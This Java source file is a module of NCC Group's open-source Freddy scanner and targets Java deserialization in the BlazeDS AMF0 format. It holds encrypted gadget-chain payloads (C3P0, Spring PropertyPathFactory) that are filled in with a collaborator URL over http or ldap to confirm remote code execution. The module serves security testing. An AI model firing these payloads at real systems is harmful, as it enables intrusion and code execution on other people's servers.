// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the AMF 0 format support of the Java
 * BlazeDS library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class BlazeDSAMF0Module extends FreddyModuleBase {
    //C3P0WrapperConnPool payload data
    private static final int C3P0WRAP_PAYLOAD_CMD_OFFSET = 1154;
    private final String C3P0WRAP_PREFIX_B64 = decrypt("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");
    private final String C3P0WRAP_SUFFIX_B64 = decrypt("1CnJChbsPdDjfrLdUKMHl8sUfOPeKLNud6hMcC41NTk=");
    //SpringPropertyPathFactory payload data
    private static final int SPPF_PAYLOAD_CMD_OFFSET1 = 86;
    private static final int SPPF_PAYLOAD_CMD_OFFSET2 = 448;
    private final String SPPF_PREFIX_B64 = decrypt("v4ZvSYERQyxiaFWoyBZFVYxygqYJ2S6Pr46rPSmfb1sdRuFz5ZK62K4jqjK5mtt791Qsz3BrekVcVoSFb/59BVcgV7yUVML0hdH67VEpt3RR4JD2kRAzOmfe+glS4jRrt4WPtTpbjim9Lf/z1bUEf0Zb5ugPbc5Y3MDSQ3yd+1E=");
    private final String SPPF_MIDDLE_B64 = decrypt("I5nCSju3tRVwQJ/zwadw991rTLw6MS4BM8WF21iSARk37MJCf9gCXQFOt4wIQSdj2AbWFqTOjbD7UpHDSkPpkRXNDlm3CB4WFfdun/46KW/J1P7nMiiQuseWHUHKh4lY3ZQDyK54/jsjij1D37LIJVn2o3KzXUg6FgZiq36OOfF0WbLZGgFJBfJheYsW+x2kCerK/XjReF/o+14DFNRFGdSJCy9hXoVudO378VlW+YlCGct2p7fgd1TOSHIISIP3ww//shs/dfFhjuIHOOyqrD0xrZNANOHb4a6HkD7qn1A=");
    private final String SPPF_SUFFIX_B64 = decrypt("/MT6upgF4O8xmG/l40d+dw==");
    private byte[] C3P0WRAP_PAYLOAD;
    private byte[] SPPF_PAYLOAD;

    protected void initialiseModule() {
        setName("BlazeDS-AMF0");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        C3P0WRAP_PAYLOAD = buildBinaryPayloadBuffer(C3P0WRAP_PREFIX_B64, C3P0WRAP_SUFFIX_B64, true); //Note, this payload isn't actually unicode but is encoded as hex-ascii so requires two bytes space per byte of payload
        SPPF_PAYLOAD = buildBinaryPayloadBuffer(SPPF_PREFIX_B64, SPPF_MIDDLE_B64, SPPF_SUFFIX_B64, false);

        //Register active scan payloads (passive scan is handled by BlazeDSPassiveDetectionModule)
        registerActiveScanExceptionPayload(new byte[]{0x10, 0x00, 0x0b, 0x46, 0x72, 0x65, 0x64, 0x64, 0x79, 0x44, 0x65, 0x73, 0x65, 0x72}, Pattern.compile("Cannot create class of type ((')|(&#39;))FreddyDeser((')|(&#39;))\\."));

        registerActiveScanCollaboratorPayload(PN_C3P0WCP, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0WCP:
                return generateBinaryPayloadWithAscHexCommand(C3P0WRAP_PAYLOAD, C3P0WRAP_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/");

            case PN_SPRINGPPF:
                return generateBinaryPayload(SPPF_PAYLOAD, SPPF_PAYLOAD_CMD_OFFSET1, SPPF_PAYLOAD_CMD_OFFSET2, "ldap://" + hostname + "/", false);
        }
        return null;
    }
}
